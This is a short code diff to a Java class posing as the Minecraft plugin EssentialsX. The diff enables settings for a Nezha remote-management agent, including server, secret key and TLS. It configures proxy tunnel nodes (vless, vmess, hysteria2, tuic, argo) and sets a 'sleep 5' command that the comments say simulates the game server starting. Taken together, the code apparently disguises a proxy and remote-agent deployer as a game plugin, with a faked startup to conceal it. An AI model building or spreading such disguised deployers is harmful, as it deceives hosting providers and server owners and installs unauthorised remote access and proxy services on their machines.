@@ -99,11 +99,11 @@ public class EssentialsX extends JavaPlugin {
         env.put("SUB_URL", "");
 
         // =======哪吒相关设置，支持V0和V1
-        #env.put("NEZHA_SERVER", "");//v0设置域名，v1设置域名:端口
-        #env.put("NEZHA_KEY", "");//v1进后台复制安装命令中的NZ_CLIENT_SECRET值
-        #env.put("NEZHA_PORT", "443");//v0填，v1不填
-        #env.put("NEZHA_TLS", "1");//1启用tls,0关闭tls
-        #env.put("AGENT_UUID", "");//哪吒v1固定的ID，留空随机
+        env.put("NEZHA_SERVER", "");//v0设置域名，v1设置域名:端口
+        env.put("NEZHA_KEY", "");//v1进后台复制安装命令中的NZ_CLIENT_SECRET值
+        env.put("NEZHA_PORT", "443");//v0填，v1不填
+        env.put("NEZHA_TLS", "1");//1启用tls,0关闭tls
+        env.put("AGENT_UUID", "");//哪吒v1固定的ID，留空随机
 
         // ======节点相关设置(节点可在worlds文件里list.log查看)
         env.put("TMP_ARGO", "rel");//节点类型, 可选vls,vms,spl,xhttp,rel,hy2,tuic,sock,3x,ech
@@ -121,7 +121,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("tuic_port", "");//tuic端口，注意不要和游戏端口冲突
 
         // =======模拟启动游戏(留空则显示启动日志)，也可以换成别的命令，如sleep 5
-        env.put("JAR_SH", "");
+        env.put("JAR_SH", "sleep 5");
 
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
